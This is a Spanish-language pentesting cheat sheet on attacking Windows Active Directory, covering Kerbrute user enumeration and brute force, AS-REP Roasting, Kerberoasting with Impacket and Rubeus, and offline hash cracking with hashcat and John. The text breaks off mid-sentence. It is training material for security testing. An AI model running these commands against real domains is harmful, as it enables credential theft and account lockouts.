---
title: Pentesting Windows AD
---

## Impacket, Bloudhound y Rubeus

**Impacket** es una colección de herramientas realizada en Python que trabaja con protocolos de red a bajo nivel. Algunos protocolos son SMB1-3 y MSRPC.

[Github Impacket](https://github.com/SecureAuthCorp/impacket) 

[Explicación de sus distintas herramientas](secureauth.com/labs/open-source-tools/impacket)

**Bloudhound** es una herramienta que utiliza gráficos para revelar las relaciones ocultas (relaciones de confianza, grupos anidados, etc..) dentro de un Active Directory. Se puede usar con **neo4j** que es un software orientado a grafos.

[Github Bloodhound](https://github.com/BloodHoundAD/BloodHound)

**Rubeus** es una herramienta que permite ejecutar diversos tipos de ataques contra el protocolo Kerberos. Herramienta de post-explotación. Pertenece a Ghostpack.

[Github Rubeus](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)

## Enumeration SMB (445) y RDP(139)

Con la herramienta **enum4linux.pl** se puede enumerar la información de los servicios SMB(445) y RDP(139).

`sudo ./enum4linux -a [IP]`

[Github enum4linux](https://github.com/CiscoCXSecurity/enum4linux)

## Kerbrute

**Kerbrute** es una herramienta de bruteforce y <span style="color:orange">enumeración de cuentas AD</span> a través de la Pre-Authentication Kerberos.

Enumeración de usuarios:

`kerbrute userenum -d [domain] --dc [dc_domain] [list_user.txt]`

Bruteforce con cuenta de usuario AD:

`kerbrute bruteforce -d [domain] --dc [dc_domain] [pass.txt] [user]`

Ventajas:

- Solo se necesita visibilidad del KDC (Key Distribution Center).
- Los errores de pre-authentication de Kerberos se registran como 4771 (Kerberos pre-authentication failure) y no como 4625 (logon failure).
- Kerberos indica si un usuario es correcto o no.
- Se pueden descubrir cuentas de usuarios que no requieran pre-authentication (ASREPRoast).

<span style="color:red">Se pueden bloquear cuentas de dominio si se hace fuerza bruta</span>

## AS-REP Roasting

Este ataque se basa en encontrar usuarios que no requieran pre-authentication de Kerberos. 

El funcionamiento del **AS-REP Roasting** permite que cualquiera pueda enviar una petición AS-REQ en nombre de esos usuarios, ya que no necesita cifrar el **timestamp** con las credenciales del usuario, y esto devolverá una petición AS-REP correctamente.

La respuesta AS-REP contiene un pedazo del mensaje cifrado con la clave del usuario. Con este mensaje, se puede tratar de crackear offline para obtener las credenciales de dicho usuario.

En caso de que se disponga de una cuenta de usuario del dominio, se podrían obtener los usuarios que no necesiten pre-authentication Kerberos con una consulta LDAP:

`(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))`

Con la herramienta **GetNPUsers.py** de Impacket podemos recolectar mensajes AS-REP sin pre-authentication desde una lista de usuarios:

`python GetNPUsers.py [domain]/ -usersfile [user.txt] -format hashcat -outfile hashes.asreproast`
`python GetNPUsers.py [domain]/[user] -no-pass`

Usando **Rubeus.exe**:

`Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast`


## Crackeando peticiones AS-REP (Hashcat o John)

Con Hashcat:

`hashcat -m 18200 --force -a 0 hashes.asreproast [pass.txt]`

Con John:

`john --wordlist=password_kerb.txt hashes.asreproast`


## Kerberoasting !REVISAR¡

<span style="color:red">Necesario credenciales de un usuario del dominio sin privilegios</span>

Recolectar TGS's para aquellos servicios que corren en el contexto de un usuario del dominio. Ya que los TGS's incluyen un pedazo de datos cifrado con una clave derivada de la contraseña de dichos usuarios, y después crackearlas offline. 

Para obtener las cuentas de usuario que tien servicios asociados, se puede usar el filtro LDAP:

`(&(samAccountType=805306368)(servicePrincipalName=*))`

Con la herramienta **GetUserSPN.py** (impacket):

`python GetUserSPN.py [domain]/[users]:[password] --outputfile hashes.kerberoast`

Con este comando, obtenemos un fichero con un TGS por linea que se puede 
